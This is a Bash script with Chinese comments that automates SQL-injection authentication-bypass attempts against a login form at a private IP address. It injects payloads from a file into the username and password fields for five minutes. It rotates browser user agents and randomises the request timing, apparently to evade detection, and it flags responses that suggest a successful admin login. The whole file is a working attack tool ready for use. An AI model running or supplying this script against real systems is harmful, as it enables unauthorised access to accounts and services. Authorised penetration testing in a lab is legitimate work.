#!/bin/bash

# SQL注入测试脚本
# 使用Auth_Bypass.txt中的载荷测试认证绕过漏洞

# 配置参数
TARGET_URL="https://192.168.139.141/login"  # 目标登录URL
DURATION=300                          # 测试持续时间(秒)
BASE_RATE=3                           # 基础请求速率(请求/秒)
LOG_FILE="sql_auth_bypass_$(date +%Y%m%d_%H%M%S).log"
PAYLOAD_FILE="Auth_Bypass.txt"

# 用户代理列表
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
  "curl/7.68.0"
)

# 检查载荷文件是否存在
if [ ! -f "$PAYLOAD_FILE" ]; then
  echo "错误: 载荷文件 $PAYLOAD_FILE 不存在!"
  exit 1
fi

# 读取载荷文件
mapfile -t PAYLOADS < "$PAYLOAD_FILE"

# 初始化日志文件
echo "SQL注入认证绕过测试报告 - $(date)" > $LOG_FILE
echo "目标URL: $TARGET_URL" >> $LOG_FILE
echo "载荷文件: $PAYLOAD_FILE" >> $LOG_FILE
echo "开始时间: $(date +%T)" >> $LOG_FILE
echo "----------------------------------------" >> $LOG_FILE

# 主扫描函数
start_scan() {
  local start_time=$(date +%s)
  local end_time=$((start_time + DURATION))
  local current_time=$(date +%s)
  local request_count=0
  local success_count=0
  
  while [ $current_time -lt $end_time ]; do
    # 随机选择载荷和用户代理
    local random_payload=${PAYLOADS[$RANDOM % ${#PAYLOADS[@]}]}
    local user_agent=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    
    # 随机请求速率(基础速率±2)
    local current_rate=$((BASE_RATE + (RANDOM % 5) - 2))
    [ $current_rate -lt 1 ] && current_rate=1
    
    # 构建POST数据
    local post_data=""
    case $((RANDOM % 3)) in
      0) # 作为用户名
        post_data="username=${random_payload}&password=injected"
        ;;
      1) # 作为密码
        post_data="username=admin&password=${random_payload}"
        ;;
      2) # 同时作为用户名和密码
        post_data="username=${random_payload}&password=${random_payload}"
        ;;
    esac
    
    # 发送请求
    echo "[$(date +%T)] 测试 #$((++request_count)): ${post_data:0:60}..." | tee -a $LOG_FILE
    
    # 执行curl请求并分析响应
    local response=$(curl -X POST -s -k -v --http3 \
      -A "$user_agent" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "X-Request-ID: $(date +%s%N)-$RANDOM" \
      -d "$post_data" \
      "$TARGET_URL" 2>&1)
    
    # 记录完整响应(简化版)
    echo "$response" | grep -E '^< HTTP|Location:|Set-Cookie:' >> $LOG_FILE
    
    # 检测可能的成功登录
    if echo "$response" | grep -q -E '302 Found|Location: /dashboard|Set-Cookie: session|Welcome, admin'; then
      echo "[!] 可能的认证绕过成功: ${post_data:0:60}" >> $LOG_FILE
      ((success_count++))
    fi
    
    # 随机延迟控制速率
    sleep $(awk "BEGIN {print (1/$current_rate) + (($RANDOM%1000)/3000)}")
    
    current_time=$(date +%s)
  done
  
  echo "----------------------------------------" >> $LOG_FILE
  echo "扫描完成" >> $LOG_FILE
  echo "总请求数: $request_count" >> $LOG_FILE
  echo "可能的成功绕过次数: $success_count" >> $LOG_FILE
  echo "平均速率: $((request_count / DURATION)) 请求/秒" >> $LOG_FILE
}

# 执行扫描
start_scan

# 结果摘要
echo -e "\n潜在认证绕过摘要:"
grep -B2 -i "可能的认证绕过成功" $LOG_FILE | sort | uniq -c | sort -nr

echo -e "\n响应状态统计:"
grep "^< HTTP" $LOG_FILE | awk '{print $2}' | sort | uniq -c | sort -nr
